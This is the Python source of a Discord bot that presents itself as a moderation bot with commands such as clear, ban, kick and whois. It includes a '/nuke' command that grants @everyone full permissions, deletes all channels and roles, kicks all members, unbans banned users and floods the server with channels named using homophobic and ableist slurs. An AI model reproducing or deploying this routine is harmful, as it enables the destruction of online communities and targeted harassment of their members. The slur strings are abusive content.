#imports
import discord
import asyncio
import json
import discord.member
import random
import os
from email import message
from pydoc import describe
from discord.ext import commands
from discord_slash import SlashCommand
from discord.ext.commands import Bot, has_permissions, CheckFailure
from discord import Permissions
from colorama import Fore, Style
from disnake import Guild
from requests import get
from keep_alive import keep_alive


#configs
token = ("ENTER-YOUR-TOKEN") #token
bot = commands.Bot(command_prefix="+") #prefix
slash = SlashCommand(bot, sync_commands=True)
client = bot
bad_words = [] #bad word filter
SPAM_CHANNEL =  ["you got nuked!!!!!!"] #for /nuke
CHANNEL_NAMES = ["get nuked bitch", "lol", "lol rip ur server faggot"] #for /nuke
SERVER_NAMES = 	["faggots", "nice server retard"] #for /nuke

#bot/client events
@bot.event
async def on_ready():
  await bot.change_presence(activity=discord.Game(name="moderating " + str(len(bot.guilds)) + " servers! | coded by Zockerwolf76#2937"))
  print("Bot is ready!")

@bot.event
async def on_message (message):
  print("The message's content was", message.content)
  await bot.process_commands(message)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, discord.HTTPException):
        await ctx.send("You are ratelimited")

@bot.event
async def on_message(message):
  for word in bad_words:
    if word in str.lower(message.content):
      await message.delete()


#time converter
def convert(time):
  pos = ["s","m","h","d"]

  time_dict = {"s" : 1, "m" : 60, "h" : 3600, "d": 3600*24}

  unit = time[-1]

  if unit not in pos:
    return -1
  try:
    val = int(time[:-1])
  except:
    return -2

  return val * time_dict[unit]



#/nuke
@slash.slash(name="nuke", description="nukes the server (USE IT ON YOUR OWN RISK!!!) (need administrator permissions!)")
@has_permissions(administrator=True)
async def nuke(ctx):
    await ctx.channel.purge()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.GREEN + f"@everyone has been given admin permissions in {guild.name}."+ Fore.RESET)
    except:
      print(Fore.RED + f"There was an error when attempting to give everyone perms in {guild.name}." + Fore.RESET)
    print(Style.RESET_ALL)
    await asyncio.sleep(5)
    print(f"Nuking server {guild.name}...")
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.GREEN + f"{channel.name} was successfully deleted." + Fore.RESET)
      except:
        print(Fore.RED + f"{channel.name} was not deleted." + Fore.RESET)
    for member in guild.members:
      try:
        await member.kick()
        print(Fore.GREEN + f"{member.name}#{member.discriminator} was kicked." + Fore.RESET)
      except:
        print(Fore.RED + f"{member.name}#{member.discriminator} was not kicked." + Fore.RESET)
    for role in guild.roles:
      try:
        await role.delete()
        print(Fore.GREEN + f"{role.name} was successfully deleted." + Fore.RESET)
      except:
        print(Fore.RED + f"{role.name} was not deleted." + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban()
        print(Fore.GREEN + f"{user.name}#{user.discriminator} was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.RED + f"{user.name}#{user.discriminator} was not unbanned." + Fore.RESET)
    print(Style.RESET_ALL)
    print(f"Nuked {guild.name} successfully!")
    amount = 20
    for i in range(amount):
      await guild.create_text_channel(random.choice(CHANNEL_NAMES), slowmode_delay=10)
    print(f"Nuked {guild.name} successfully")
    return


#/clear
@slash.slash(name="clear", description="clears the chat (need manage messages permissions!)")
@has_permissions(manage_messages=True)
async def clear(ctx, amount : int):
  embed = discord.Embed(title=":razor: succesfully cleared " + str(amount) + " messages :razor:", color=0x800080, description="*this message get deleted soon*")
  await ctx.channel.purge(limit=amount)
  await ctx.send(embed=embed, delete_after=3)


#/ban
@slash.slash(name="Ban", description="ban a member from your server (need ban permissions!)")
@commands.has_permissions(ban_members=True)
async def ban(ctx, user: discord.Member, *, reason="No reason provided"):
  await user.ban(reason=reason)
  ban = discord.Embed(title=f":boom: Banned {user.name}!", description=f"Reason: {reason}\nBy: {ctx.author.mention}", color=0x800080)
  await ctx.send(embed=ban)
  await user.send(embed=ban)


#/kick
@slash.slash(name="Kick", description="kick a user from your server (need kick permissions!)")
@commands.has_permissions(kick_members=True)
async def kick(ctx, user: discord.Member, *, reason="No reason provided"):
  await user.kick(reason=reason)
  kick = discord.Embed(title=f":wave: Kicked {user.name}! :wave:", description=f"Reason: {reason}\nBy: {ctx.author.mention}", color=0x800080)
  await ctx.send(embed=kick)
  await user.send(embed=kick)


#/nick
@slash.slash(name="nick", description="change the nickname of a member (need manage nicknames permissions!)")
@has_permissions(manage_nicknames=True)
async def nick(ctx, member: discord.Member, nickname):
  embed = discord.Embed(title="Nickname changed :white_check_mark: ", description= str(member) + " is now named " + (nickname), color=0x800080)
  await member.edit(nick=nickname)
  await ctx.send(embed=embed)


#/whois
@slash.slash(name="whois", description="get information of a member")
async def whois(ctx, member: discord.Member):
        roles = [role for role in member.roles]
        embed = discord.Embed(color=0x800080, timestamp=ctx.created_at, title=f"User Info - {member}")
        embed.set_thumbnail(url=member.avatar_url)
        embed.set_footer(text=f"Requested by {ctx.author}")
        embed.add_field(name="ID:", value=member.id)
        embed.add_field(name="Display Name:", value=member.display_name)
        embed.add_field(name="Created Account On:", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
        embed.add_field(name="Joined Server On:", value=member.joined_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
        embed.add_field(name="Roles:", value="".join([role.mention for role in roles]))
        embed.add_field(name="Highest Role:", value=member.top_role.mention)
        print(member.top_role.mention)
        await ctx.send(embed=embed)


#/serverinfo
@slash.slash(name="serverinfo", description="displays server info")
async def serverinfo(ctx):
  name = str(ctx.guild.name)
  description = str(ctx.guild.description)
  owner = str(ctx.guild.owner)
  id = str(ctx.guild.id)
  region = str(ctx.guild.region)
  memberCount = str(ctx.guild.member_count)
  icon = str(ctx.guild.icon_url)
  embed = discord.Embed(title=name + " Server Information", description=description, color=0x800080)
  embed.set_thumbnail(url=icon)
  embed.add_field(name="Owner", value=owner, inline=True)
  embed.add_field(name="Server ID", value=id, inline=True)
  embed.add_field(name="Region", value=region, inline=True)
  embed.add_field(name="Member Count", value=memberCount, inline=True)
  await ctx.send(embed=embed)


#/ping / bot latency
@slash.slash(name="ping", description="get bot latency / response time")
async def ping(ctx):
  embed = discord.Embed(title="__**Latency**__", color=0x800080)
  embed.add_field(name="bot ping/latency: ", value=f"`{round(bot.latency * 1000)} ms`")
  await ctx.send(embed=embed)


#/slowmode
@slash.slash(name="slowmode", description="enable/disable slowmode")
async def setdelay(ctx, seconds: int):
  embed = discord.Embed(title="slowmode!", description="Set the slowmode delay in this channel to " + str(seconds) + " seconds!", color=0x800080)
  await ctx.channel.edit(slowmode_delay=seconds)
  await ctx.send(embed=embed)


#/meme
@slash.slash(name="meme", description="posts a meme")
async def meme(ctx):
    content = get("https://meme-api.herokuapp.com/gimme").text
    data = json.loads(content,)
    meme = discord.Embed(title=f"{data['title']}", color=0x800080).set_image(url=f"{data['url']}")
    await ctx.reply(embed=meme)



            

#bot run and hosting
keep_alive()
bot.run(token)
